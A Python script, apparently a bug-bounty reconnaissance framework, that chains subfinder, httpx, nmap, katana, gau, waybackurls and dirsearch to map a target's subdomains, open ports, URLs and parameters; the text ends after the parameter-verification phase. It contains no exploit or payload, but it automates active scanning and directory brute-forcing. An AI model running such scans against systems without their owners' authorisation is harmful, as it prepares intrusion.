#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║          BugBounty AutoScanner — Professional Recon Framework        ║
║          Designed for Kali Linux | Bug Bounty Automation             ║
╚══════════════════════════════════════════════════════════════════════╝

Usage:
    python3 scanner.py example.com
    python3 scanner.py -l domains.txt
    python3 scanner.py example.com --threads 50 --rate-limit 100
    python3 scanner.py example.com --skip-subfinder --crawl-only
    python3 scanner.py example.com --resume
"""

import argparse
import concurrent.futures
import csv
import json
import logging
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import List, Optional, Set

# ─── Third-party (optional) ────────────────────────────────────────────────
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

# ═══════════════════════════════════════════════════════════════════════════
#  ANSI COLOR PALETTE
# ═══════════════════════════════════════════════════════════════════════════

class Colors:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"
    BG_RED  = "\033[41m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


# ═══════════════════════════════════════════════════════════════════════════
#  LOGGING SETUP
# ═══════════════════════════════════════════════════════════════════════════

class ColoredFormatter(logging.Formatter):
    LEVEL_COLORS = {
        logging.DEBUG:    Colors.GRAY,
        logging.INFO:     Colors.GREEN,
        logging.WARNING:  Colors.YELLOW,
        logging.ERROR:    Colors.RED,
        logging.CRITICAL: Colors.BG_RED + Colors.WHITE,
    }
    LEVEL_LABELS = {
        logging.DEBUG:    "DBG",
        logging.INFO:     "INF",
        logging.WARNING:  "WRN",
        logging.ERROR:    "ERR",
        logging.CRITICAL: "CRT",
    }

    def format(self, record: logging.LogRecord) -> str:
        color = self.LEVEL_COLORS.get(record.levelno, Colors.RESET)
        label = self.LEVEL_LABELS.get(record.levelno, "???")
        ts = datetime.now().strftime("%H:%M:%S")
        prefix = f"{Colors.GRAY}[{ts}]{Colors.RESET} {color}[{label}]{Colors.RESET}"
        return f"{prefix} {record.getMessage()}"


def setup_logging(log_file: Optional[str] = None, verbose: bool = False) -> logging.Logger:
    logger = logging.getLogger("scanner")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    logger.handlers.clear()

    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.DEBUG if verbose else logging.INFO)
    ch.setFormatter(ColoredFormatter())
    logger.addHandler(ch)

    if log_file:
        fh = logging.FileHandler(log_file)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        logger.addHandler(fh)

    return logger


# ═══════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "tools": {
        "subfinder":    "subfinder",
        "assetfinder":  "assetfinder",
        "httpx":        "httpx",
        "waybackurls":  "waybackurls",
        "gau":          "gau",
        "katana":        "katana",
        "dirsearch":    "dirsearch",
        "nuclei":       "nuclei",
    },
    "threads": 50,
    "rate_limit": 20,
    "timeout": 30,
    "nuclei_severity": "low,medium,high,critical",
    "nuclei_concurrency": 20,
    "nuclei_rate_limit": 20,
    "katana_depth": 3,
    "dirsearch_wordlist": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    "dirsearch_extensions": "php,asp,aspx,jsp,html,json,txt,xml,bak,old,zip",
    "static_extensions": {
        "css", "js", "jpg", "jpeg", "png", "gif", "svg", "ico",
        "woff", "woff2", "ttf", "eot", "pdf", "mp4", "mp3",
        "zip", "tar", "gz", "rar", "map", "min.js", "min.css",
    },
    "telegram": {
        "enabled": False,
        "bot_token": "",
        "chat_id": "",
    },
    "output_base": "output",
    "proxy": "",           # HTTP/SOCKS5 proxy (e.g. http://127.0.0.1:8080)
    "scope_domains": [],   # allowed in-scope domains (empty = target only)
    "monitor_interval": 0, # continuous monitoring interval in hours (0 = off)
}


def load_config(config_path: Optional[str] = None) -> dict:
    config = DEFAULT_CONFIG.copy()
    if config_path and YAML_AVAILABLE:
        try:
            with open(config_path) as f:
                user_cfg = yaml.safe_load(f)
            if user_cfg:
                for k, v in user_cfg.items():
                    if isinstance(v, dict) and k in config:
                        config[k].update(v)
                    else:
                        config[k] = v
        except Exception:
            pass
    return config


# ═══════════════════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════════════════════════

_shutdown_event = threading.Event()
_scan_lock = threading.Lock()


def handle_sigint(sig, frame):
    print(colorize("\n\n[!] Interrupt received — shutting down gracefully...", Colors.YELLOW))
    _shutdown_event.set()


signal.signal(signal.SIGINT, handle_sigint)


# ═══════════════════════════════════════════════════════════════════════════
#  DEPENDENCY CHECK
# ═══════════════════════════════════════════════════════════════════════════

REQUIRED_TOOLS = ["subfinder", "httpx", "nuclei", "katana", "gau", "waybackurls"]
OPTIONAL_TOOLS = ["assetfinder", "dirsearch"]


def check_dependencies(config: dict, logger: logging.Logger) -> bool:
    logger.info(colorize("Checking tool dependencies...", Colors.CYAN))
    all_ok = True
    env_path = _build_env().get("PATH")

    for tool in REQUIRED_TOOLS:
        tool_path = config["tools"].get(tool, tool)
        if shutil.which(tool_path, path=env_path):
            logger.info(f"  {colorize('✓', Colors.GREEN)} {tool}")
        else:
            logger.error(f"  {colorize('✗', Colors.RED)} {tool} — NOT FOUND (required)")
            all_ok = False

    for tool in OPTIONAL_TOOLS:
        tool_path = config["tools"].get(tool, tool)
        if shutil.which(tool_path, path=env_path):
            logger.info(f"  {colorize('✓', Colors.GREEN)} {tool} (optional)")
        else:
            logger.warning(f"  {colorize('-', Colors.YELLOW)} {tool} — not found (optional, skipping)")

    return all_ok


# ═══════════════════════════════════════════════════════════════════════════
#  FILE / IO UTILITIES
# ═══════════════════════════════════════════════════════════════════════════

def read_lines(filepath: str) -> List[str]:
    """Read non-empty, stripped lines from a file."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []


def write_lines(filepath: str, lines: List[str], mode: str = "w") -> int:
    """Write unique lines to a file. Returns count."""
    unique = sorted(set(lines))
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    with open(filepath, mode, encoding="utf-8") as f:
        for line in unique:
            f.write(line + "\n")
    return len(unique)


def append_lines(filepath: str, lines: List[str]) -> int:
    existing = set(read_lines(filepath))
    new_lines = [l for l in lines if l not in existing]
    if new_lines:
        write_lines(filepath, list(existing | set(new_lines)))
    return len(new_lines)


def count_lines(filepath: str) -> int:
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for _ in f)
    except FileNotFoundError:
        return 0


def ensure_dir(path: str):
    Path(path).mkdir(parents=True, exist_ok=True)


# ═══════════════════════════════════════════════════════════════════════════
#  COMMAND RUNNER
# ═══════════════════════════════════════════════════════════════════════════

def _build_env() -> dict:
    """Build subprocess environment with Go binary paths injected."""
    env = os.environ.copy()
    home = os.path.expanduser("~")
    extra_paths = [
        os.path.join(home, "go", "bin"),
        "/usr/local/go/bin",
        "/root/go/bin",
        os.path.join(home, ".local", "bin"),
    ]
    current_path = env.get("PATH", "")
    additions = [p for p in extra_paths if p not in current_path and os.path.isdir(p)]
    if additions:
        env["PATH"] = current_path + ":" + ":".join(additions)
    return env


def _build_proxies(config: dict) -> Optional[dict]:
    """Return requests-compatible proxy dict, or None if not configured."""
    proxy = config.get("proxy", "").strip()
    if not proxy:
        return None
    return {"http": proxy, "https": proxy}


def _proxy_env(config: dict) -> dict:
    """Inject proxy into subprocess environment variables."""
    env = _build_env()
    proxy = config.get("proxy", "").strip()
    if proxy:
        env["HTTP_PROXY"]  = proxy
        env["HTTPS_PROXY"] = proxy
        env["http_proxy"]  = proxy
        env["https_proxy"] = proxy
    return env


def run_command(
    cmd: List[str],
    output_file: Optional[str] = None,
    timeout: int = 300,
    logger: Optional[logging.Logger] = None,
    capture: bool = False,
) -> Optional[str]:
    """
    Execute a shell command.
    - If output_file is given, stdout is written there.
    - If capture=True, return stdout as string.
    - Returns None on failure.
    """
    if _shutdown_event.is_set():
        return None

    cmd_str = " ".join(cmd)
    if logger:
        logger.debug(f"Running: {colorize(cmd_str, Colors.GRAY)}")

    env = _build_env()  # Note: callers that need proxy pass config; env-var proxy is set separately

    # Re-resolve tool path with enriched env
    tool_path = shutil.which(cmd[0], path=env.get("PATH"))
    if tool_path:
        cmd = [tool_path] + cmd[1:]

    try:
        if output_file:
            ensure_dir(os.path.dirname(output_file))
            with open(output_file, "w", encoding="utf-8") as out_f:
                proc = subprocess.Popen(
                    cmd,
                    stdout=out_f,
                    stderr=subprocess.DEVNULL,
                    env=env,
                )
                try:
                    proc.wait(timeout=timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
                    if logger:
                        logger.warning(f"Timeout — killed: {cmd[0]}")
            return output_file if os.path.exists(output_file) else None

        elif capture:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=timeout,
                text=True,
                env=env,
            )
            return result.stdout

        else:
            subprocess.run(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=timeout,
                env=env,
            )
            return "ok"

    except subprocess.TimeoutExpired as e:
        # subprocess.run timeout (capture/silent modes)
        if hasattr(e, 'process') and e.process:
            try:
                e.process.kill()
                e.process.wait()
            except Exception:
                pass
        if logger:
            logger.warning(f"Timeout — killed: {cmd[0]}")
        return None
    except FileNotFoundError:
        if logger:
            logger.error(f"Tool not found: {cmd[0]}")
        return None
    except Exception as e:
        if logger:
            logger.error(f"Error running {cmd[0]}: {e}")
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  INPUT NORMALIZATION
# ═══════════════════════════════════════════════════════════════════════════

def normalize_domain(domain: str) -> str:
    """Strip protocol, path, spaces. Return bare hostname."""
    domain = domain.strip()
    domain = re.sub(r"^https?://", "", domain, flags=re.IGNORECASE)
    domain = domain.split("/")[0].split("?")[0].split("#")[0]
    return domain.lower()


def load_targets(domains: List[str], domains_file: Optional[str]) -> List[str]:
    """Merge CLI domains + file domains, normalize, deduplicate."""
    raw: List[str] = list(domains)
    if domains_file:
        raw.extend(read_lines(domains_file))
    normalized = [normalize_domain(d) for d in raw if d.strip()]
    return sorted(set(normalized))


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 2 — SUBDOMAIN ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════

def run_subfinder(domain: str, out_dir: str, config: dict, logger: logging.Logger) -> List[str]:
    out_file = os.path.join(out_dir, "subfinder_raw.txt")
    tool = config["tools"]["subfinder"]
    logger.info(f"  Running subfinder on {colorize(domain, Colors.CYAN)}")
    run_command(
        [tool, "-d", domain, "-silent", "-o", out_file],
        timeout=180,
        logger=logger,
    )
    results = read_lines(out_file)
    logger.info(f"  subfinder found {colorize(str(len(results)), Colors.GREEN)} subdomains")
    return results


def run_assetfinder(domain: str, out_dir: str, config: dict, logger: logging.Logger) -> List[str]:
    tool = config["tools"]["assetfinder"]
    if not shutil.which(tool):
        return []
    logger.info(f"  Running assetfinder on {colorize(domain, Colors.CYAN)}")
    out_file = os.path.join(out_dir, "assetfinder_raw.txt")
    output = run_command([tool, "--subs-only", domain], capture=True, timeout=120, logger=logger)
    if output:
        lines = [l.strip() for l in output.splitlines() if l.strip()]
        write_lines(out_file, lines)
        logger.info(f"  assetfinder found {colorize(str(len(lines)), Colors.GREEN)} subdomains")
        return lines
    return []


def enumerate_subdomains(
    domain: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
    skip_subfinder: bool = False,
) -> str:
    """
    Run all subdomain tools in parallel, merge & deduplicate into subdomains.txt.
    Returns path to subdomains.txt.
    """
    logger.info(colorize(f"[PHASE 2] Subdomain enumeration for {domain}", Colors.MAGENTA + Colors.BOLD))
    out_file = os.path.join(out_dir, "subdomains.txt")

    if skip_subfinder:
        logger.warning("  Subfinder skipped by user flag")
        write_lines(out_file, [domain])
        return out_file

    # Always seed with root domain and www
    all_subs: Set[str] = {domain, f"www.{domain}"}
    config["_current_domain"] = domain  # Store for fallback use in other phases

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as exe:
        futures = {
            exe.submit(run_subfinder, domain, out_dir, config, logger): "subfinder",
            exe.submit(run_assetfinder, domain, out_dir, config, logger): "assetfinder",
        }
        for fut in concurrent.futures.as_completed(futures):
            try:
                results = fut.result()
                all_subs.update(results)
            except Exception as e:
                logger.error(f"  Subdomain tool error: {e}")

    # Filter to only subdomains of the target domain (keep root and www too)
    filtered = {s for s in all_subs if s.endswith(f".{domain}") or s == domain}
    count = write_lines(out_file, list(filtered))
    logger.info(f"  Total unique subdomains: {colorize(str(count), Colors.GREEN)}")
    logger.debug(f"  Subdomains: {', '.join(sorted(filtered)[:10])}")
    return out_file


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 3 — LIVE HOST DETECTION
# ═══════════════════════════════════════════════════════════════════════════

def _is_pd_httpx(binary: str) -> bool:
    """Return True if the binary is ProjectDiscovery's httpx (not the Python one)."""
    try:
        result = subprocess.run(
            [binary, "-version"],
            capture_output=True, text=True, timeout=5,
            env=_build_env(),
        )
        output = (result.stdout + result.stderr).lower()
        return "projectdiscovery" in output or "current" in output or "httpx v" in output
    except Exception:
        return False


def _resolve_httpx_tool(config: dict) -> Optional[str]:
    """
    Resolve ProjectDiscovery httpx binary.
    Priority: go-installed > httpx-toolkit (apt/kali) > configured path.
    Validates that the binary is actually PD's httpx, not the Python one.
    """
    env_path = _build_env().get("PATH")
    home = os.path.expanduser("~")

    # Explicit paths to check first (most reliable)
    priority_paths = [
        os.path.join(home, "go", "bin", "httpx"),
        "/root/go/bin/httpx",
        "/usr/local/go/bin/httpx",
    ]
    for p in priority_paths:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p

    # Then check named binaries
    for name in ["httpx-toolkit", config["tools"].get("httpx", "httpx"), "httpx"]:
        found = shutil.which(name, path=env_path)
        if found and _is_pd_httpx(found):
            return found

    # Last resort: any httpx-toolkit even if not validated
    found = shutil.which("httpx-toolkit", path=env_path)
    if found:
        return found

    return None


def run_httpx(
    input_file: str,
    out_file: str,
    config: dict,
    logger: logging.Logger,
    extra_flags: Optional[List[str]] = None,
) -> str:
    tool = _resolve_httpx_tool(config)
    if not tool:
        logger.error("  httpx / httpx-toolkit not found! Install: go install github.com/projectdiscovery/httpx/cmd/httpx@latest")
        return out_file

    logger.info(colorize("[PHASE 3] Live host detection with httpx", Colors.MAGENTA + Colors.BOLD))
    logger.info(f"  Using: {os.path.basename(tool)}")

    input_count = count_lines(input_file)
    if input_count == 0:
        logger.warning("  Input file is empty — skipping httpx")
        return out_file
    logger.info(f"  Probing {input_count} hosts...")

    threads = str(min(int(config["threads"]), 50))
    cmd = [
        tool,
        "-l", input_file,
        "-o", out_file,
        "-silent",
        "-follow-redirects",
        "-status-code",
        "-threads", threads,
        "-timeout", "15",
        "-retries", "2",
    ]
    if extra_flags:
        cmd.extend(extra_flags)
    proxy = config.get("proxy", "").strip()
    if proxy:
        cmd += ["-http-proxy", proxy]

    # Capture stderr to diagnose errors
    env = _proxy_env(config)
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=300, env=env
        )
        if proc.returncode != 0 and proc.stderr:
            for line in proc.stderr.splitlines()[:5]:
                if line.strip():
                    logger.warning(f"  httpx: {line.strip()}")
    except subprocess.TimeoutExpired:
        logger.warning("  httpx timed out")
    except FileNotFoundError:
        logger.error(f"  httpx binary not executable: {tool}")
        return out_file

    count = count_lines(out_file)
    logger.info(f"  Alive hosts: {colorize(str(count), Colors.GREEN)}")

    # Fallback: if no alive hosts, add root domain as seed
    if count == 0:
        logger.warning("  No alive hosts detected — adding root domain as fallback")
        fallback = [f"https://{config.get('_current_domain', '')}",
                    f"http://{config.get('_current_domain', '')}"]
        fallback = [u for u in fallback if config.get('_current_domain')]
        if fallback:
            write_lines(out_file, fallback)
            count = len(fallback)
            logger.info(f"  Fallback hosts added: {colorize(str(count), Colors.GREEN)}")

    return out_file


# Common web/service ports for nmap scan
_NMAP_WEB_PORTS = "80,443,8080,8443,8000,8888,3000,5000,9000,4433,8444,9443,7080,8081"


def run_nmap_port_scan(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> str:
    """
    Run nmap port scan on alive hosts to detect open ports.
    Saves results to open_ports.txt (format: host:port1,port2,... per line).
    Returns path to open_ports.txt.
    """
    nmap_bin = shutil.which("nmap")
    if not nmap_bin:
        logger.warning("  nmap not found — port scan skipped")
        return ""

    hosts = extract_urls_from_httpx_output(alive_file)
    if not hosts:
        hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    if not hosts:
        logger.warning("  No alive hosts for port scan")
        return ""

    # Extract unique hostnames
    hostnames: Set[str] = set()
    for url in hosts:
        try:
            p = urllib.parse.urlparse(url)
            h = p.hostname or p.netloc.split(":")[0]
            if h and not h.startswith("["):
                hostnames.add(h)
        except Exception:
            pass
    hostnames = hostnames - {"localhost", "127.0.0.1"}
    if not hostnames:
        return ""

    hosts_txt = os.path.join(out_dir, "nmap_hosts.txt")
    gnmap_out = os.path.join(out_dir, "nmap_scan.gnmap")
    open_ports_file = os.path.join(out_dir, "open_ports.txt")

    write_lines(hosts_txt, sorted(hostnames))
    ports = config.get("nmap_ports", _NMAP_WEB_PORTS)

    logger.info(colorize("[PHASE 3b] Port scan with nmap", Colors.MAGENTA + Colors.BOLD))
    logger.info(f"  Scanning {len(hostnames)} hosts for ports: {ports}")

    cmd = [
        nmap_bin,
        "-Pn",
        "-sT",
        "-p", ports,
        "-iL", hosts_txt,
        "-oG", gnmap_out,
        "--open",
        "-T4",
    ]
    proxy = config.get("proxy", "").strip()
    if proxy:
        # nmap doesn't use HTTP proxy for host discovery; skip for now
        pass

    env = _proxy_env(config)
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600,
            env=env,
        )
        if proc.returncode != 0 and proc.stderr:
            for line in proc.stderr.splitlines()[:3]:
                if line.strip():
                    logger.warning(f"  nmap: {line.strip()}")
    except subprocess.TimeoutExpired:
        logger.warning("  nmap timed out")
        return ""
    except FileNotFoundError:
        return ""

    # Parse gnmap for open ports (Host: ... Ports: 80/open/tcp//http/, 443/open/tcp//https/)
    results: List[str] = []
    total_ports = 0
    try:
        for line in read_lines(gnmap_out):
            if "Ports:" not in line or "Host:" not in line:
                continue
            # Format: Host: 1.2.3.4 () Ports: 80/open/tcp//http/, 443/open/tcp//https/
            m = re.search(r"Host:\s*([^\s]+)", line)
            if not m:
                continue
            host = m.group(1).strip()
            ports_m = re.search(r"Ports:\s*([^\t]+)", line)
            if not ports_m:
                continue
            port_str = ports_m.group(1)
            open_ports = []
            for part in port_str.split(","):
                part = part.strip()
                if "/open/" in part:
                    p = part.split("/")[0]
                    if p.isdigit():
                        open_ports.append(p)
            if open_ports:
                results.append(f"{host}:{','.join(open_ports)}")
                total_ports += len(open_ports)
    except Exception:
        pass

    write_lines(open_ports_file, results)
    logger.info(f"  Open ports: {colorize(str(total_ports), Colors.GREEN)} across {len(results)} hosts")
    return open_ports_file


def extract_urls_from_httpx_output(httpx_file: str) -> List[str]:
    """Extract just the URL part from httpx output (strips status codes etc.)."""
    urls = []
    for line in read_lines(httpx_file):
        # httpx outputs: https://example.com [200]
        parts = line.split()
        if parts:
            url = parts[0].strip()
            if url.startswith("http"):
                urls.append(url)
    return urls


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 4 — URL COLLECTION
# ═══════════════════════════════════════════════════════════════════════════

def _tool_path(name: str, config: dict) -> Optional[str]:
    """Resolve a tool binary using enriched PATH."""
    env_path = _build_env().get("PATH")
    configured = config["tools"].get(name, name)
    return shutil.which(configured, path=env_path) or shutil.which(name, path=env_path)


def run_waybackurls(domain: str, out_dir: str, config: dict, logger: logging.Logger) -> List[str]:
    tool = _tool_path("waybackurls", config)
    if not tool:
        logger.warning("  waybackurls not found — install: go install github.com/tomnomnom/waybackurls@latest")
        return []
    out_file = os.path.join(out_dir, "wayback_raw.txt")
    logger.info(f"  Running waybackurls for {domain}")
    output = run_command([tool, domain], capture=True, timeout=180, logger=logger)
    if output:
        lines = [l.strip() for l in output.splitlines() if l.strip()]
        write_lines(out_file, lines)
        logger.info(f"  waybackurls: {colorize(str(len(lines)), Colors.GREEN)} URLs")
        return lines
    logger.warning("  waybackurls returned no results")
    return []


def run_gau(domain: str, out_dir: str, config: dict, logger: logging.Logger) -> List[str]:
    tool = _tool_path("gau", config)
    if not tool:
        logger.warning("  gau not found — install: go install github.com/lc/gau/v2/cmd/gau@latest")
        return []
    out_file = os.path.join(out_dir, "gau_raw.txt")
    logger.info(f"  Running gau for {domain}")
    output = run_command(
        [tool, "--threads", "5", "--timeout", "30", "--retries", "2", domain],
        capture=True, timeout=240, logger=logger,
    )
    if output:
        lines = [l.strip() for l in output.splitlines() if l.strip()]
        write_lines(out_file, lines)
        logger.info(f"  gau: {colorize(str(len(lines)), Colors.GREEN)} URLs")
        return lines
    logger.warning("  gau returned no results")
    return []


def run_katana(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[str]:
    tool = _tool_path("katana", config)
    if not tool:
        logger.warning("  katana not found — install: go install github.com/projectdiscovery/katana/cmd/katana@latest")
        return []

    alive_hosts = extract_urls_from_httpx_output(alive_file)
    if not alive_hosts:
        alive_hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    if not alive_hosts:
        logger.warning("  katana: no alive hosts to crawl")
        return []

    out_file = os.path.join(out_dir, "katana_raw.txt")
    logger.info(f"  Running katana on {len(alive_hosts)} hosts")
    run_command(
        [
            tool,
            "-list", alive_file,
            "-d", str(config["katana_depth"]),
            "-silent",
            "-o", out_file,
            "-c", "10",
            "-rate-limit", str(min(int(config["rate_limit"]), 50)),
            "-timeout", "20",
            "-no-color",
            "-js-crawl",
            "-known-files", "all",
            *(["-proxy", config["proxy"]] if config.get("proxy") else []),
        ],
        timeout=600,
        logger=logger,
    )
    results = read_lines(out_file)
    logger.info(f"  katana: {colorize(str(len(results)), Colors.GREEN)} URLs")
    return results


def collect_urls(
    domain: str,
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> str:
    logger.info(colorize(f"[PHASE 4] URL collection for {domain}", Colors.MAGENTA + Colors.BOLD))
    all_urls_file = os.path.join(out_dir, "all_urls.txt")

    # Extract alive URLs as seeds
    alive_urls = extract_urls_from_httpx_output(alive_file)
    if not alive_urls:
        alive_urls = [l for l in read_lines(alive_file) if l.startswith("http")]

    # Always run passive URL collection on root domain regardless of alive hosts
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as exe:
        fut_wb  = exe.submit(run_waybackurls, domain, out_dir, config, logger)
        fut_gau = exe.submit(run_gau, domain, out_dir, config, logger)
        fut_kat = exe.submit(run_katana, alive_file, out_dir, config, logger)
        wb_urls  = fut_wb.result()
        gau_urls = fut_gau.result()
        kat_urls = fut_kat.result()

    merged = set(alive_urls) | set(wb_urls) | set(gau_urls) | set(kat_urls)
    # Remove obviously broken entries
    merged = {u for u in merged if u.startswith("http") and len(u) < 2048}
    count = write_lines(all_urls_file, list(merged))
    logger.info(f"  Total unique URLs collected: {colorize(str(count), Colors.GREEN)}")

    if count == 0:
        logger.warning("  0 URLs collected — passive tools may need internet access")
        logger.warning("  Try: source ~/.zshrc && go install github.com/tomnomnom/waybackurls@latest")

    return all_urls_file


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 5 — DIRECTORY DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════

def _resolve_dirsearch() -> Optional[List[str]]:
    """
    Return the command prefix to invoke dirsearch.
    Tries: standalone binary → python3 -m dirsearch → python3 /path/dirsearch.py
    """
    env_path = _build_env().get("PATH")

    # 1. Standalone binary
    for name in ["dirsearch", "dirsearch.py"]:
        found = shutil.which(name, path=env_path)
        if found:
            return [found]

    # 2. Python module
    try:
        result = subprocess.run(
            ["python3", "-m", "dirsearch", "--version"],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            return ["python3", "-m", "dirsearch"]
    except Exception:
        pass

    # 3. Common install paths
    common_paths = [
        "/usr/lib/python3/dist-packages/dirsearch/__main__.py",
        "/usr/local/lib/python3/dist-packages/dirsearch/__main__.py",
        os.path.expanduser("~/.local/bin/dirsearch"),
        "/opt/dirsearch/dirsearch.py",
    ]
    for p in common_paths:
        if os.path.isfile(p):
            return ["python3", p]

    return None


def run_dirsearch(
    alive_file: str,
    all_urls_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> None:
    logger.info(colorize("[PHASE 5] Directory discovery with dirsearch", Colors.MAGENTA + Colors.BOLD))

    cmd_prefix = _resolve_dirsearch()
    if not cmd_prefix:
        logger.warning("  dirsearch not found — install: pip3 install dirsearch --break-system-packages")
        logger.warning("  Skipping directory discovery")
        return

    logger.info(f"  Using: {' '.join(cmd_prefix)}")

    alive_hosts = extract_urls_from_httpx_output(alive_file)
    if not alive_hosts:
        alive_hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    if not alive_hosts:
        logger.warning("  No alive hosts for dirsearch")
        return

    dirsearch_out = os.path.join(out_dir, "dirsearch_raw.txt")
    found_paths: List[str] = []
    wordlist    = config["dirsearch_wordlist"]
    extensions  = config["dirsearch_extensions"]

    for host in alive_hosts[:10]:
        if _shutdown_event.is_set():
            break
        safe_name = urllib.parse.quote(host, safe="")[:60]
        ds_out = os.path.join(out_dir, f"ds_{safe_name}.txt")

        cmd = cmd_prefix + [
            "-u", host,
            "-e", extensions,
            "--plain-text-report", ds_out,
            "-q",
            "--no-color",
            "-t", "20",
            "--timeout", "10",
        ]
        if os.path.exists(wordlist):
            cmd += ["-w", wordlist]

        logger.info(f"  dirsearch → {host}")
        run_command(cmd, timeout=300, logger=logger)
        found_paths.extend(read_lines(ds_out))

    if found_paths:
        append_lines(all_urls_file, found_paths)
        write_lines(dirsearch_out, found_paths)
        logger.info(f"  dirsearch found: {colorize(str(len(found_paths)), Colors.GREEN)} paths")
    else:
        logger.info("  dirsearch found 0 new paths")


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 6 — URL FILTERING
# ═══════════════════════════════════════════════════════════════════════════

def is_static_url(url: str, static_exts: Set[str]) -> bool:
    parsed = urllib.parse.urlparse(url)
    path = parsed.path.lower()
    ext = path.rsplit(".", 1)[-1] if "." in path else ""
    return ext in static_exts


def is_in_scope(url: str, domain: str) -> bool:
    try:
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc.lower().split(":")[0]
        return host == domain or host.endswith(f".{domain}")
    except Exception:
        return False


def filter_urls(
    domain: str,
    all_urls_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> str:
    logger.info(colorize("[PHASE 6] Filtering URLs", Colors.MAGENTA + Colors.BOLD))
    filtered_file = os.path.join(out_dir, "filtered_urls.txt")
    static_exts = config["static_extensions"]

    raw_urls = read_lines(all_urls_file)
    filtered: List[str] = []

    for url in raw_urls:
        if not url.startswith("http"):
            continue
        if not is_in_scope(url, domain):
            continue
        if is_static_url(url, static_exts):
            continue
        filtered.append(url)

    count = write_lines(filtered_file, filtered)
    logger.info(f"  Raw URLs: {len(raw_urls)} → Filtered: {colorize(str(count), Colors.GREEN)}")
    return filtered_file


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 7 — PARAMETER EXTRACTION
# ═══════════════════════════════════════════════════════════════════════════

def extract_params(
    filtered_file: str,
    out_dir: str,
    logger: logging.Logger,
) -> str:
    logger.info(colorize("[PHASE 7] Extracting parameterized URLs", Colors.MAGENTA + Colors.BOLD))
    params_file = os.path.join(out_dir, "params.txt")

    urls = read_lines(filtered_file)
    param_urls: List[str] = []

    for url in urls:
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            param_urls.append(url)

    count = write_lines(params_file, param_urls)
    logger.info(f"  Parameter URLs found: {colorize(str(count), Colors.GREEN)}")
    return params_file


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 8 — VERIFY ALIVE PARAM URLS
# ═══════════════════════════════════════════════════════════════════════════

def verify_alive_params(
    params_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> str:
    logger.info(colorize("[PHASE 8] Verifying alive param URLs", Colors.MAGENTA + Colors.BOLD))
    alive_params_file = os.path.join(out_dir, "alive_params.txt")

    tool = _resolve_httpx_tool(config)
    if not tool:
        logger.error("  httpx not found — skipping param verification")
        return alive_params_file

    param_count = count_lines(params_file)
    if param_count == 0:
        logger.warning("  No params to verify")
        return alive_params_file

    logger.info(f"  Verifying {param_count} param URLs with {os.path.basename(tool)}")
    threads = str(min(config["threads"], 50))

    run_command(
        [
            tool,
            "-l", params_file,
            "-o", alive_params_file,
            "-silent",
            "-threads", threads,
            "-status-code",
            "-follow-redirects",
            "-mc", "200,201,301,302,403",
            "-timeout", "15",
            "-retries", "2",
        ],
        timeout=300,
        logger=logger,
    )
    count = count_lines(alive_params_file)
    logger.info(f"  Alive param URLs: {colorize(str(count), Colors.GREEN)}")

    # Fallback: if httpx filtered all out, use raw params
    if count == 0 and param_count > 0:
        logger.warning("  httpx filtered all params — using raw params for nuclei")
        shutil.copy(params_file, alive_params_file)
        count = param_count
        logger.info(f"  Using {count} raw params as fallback")

    return alive_params_file


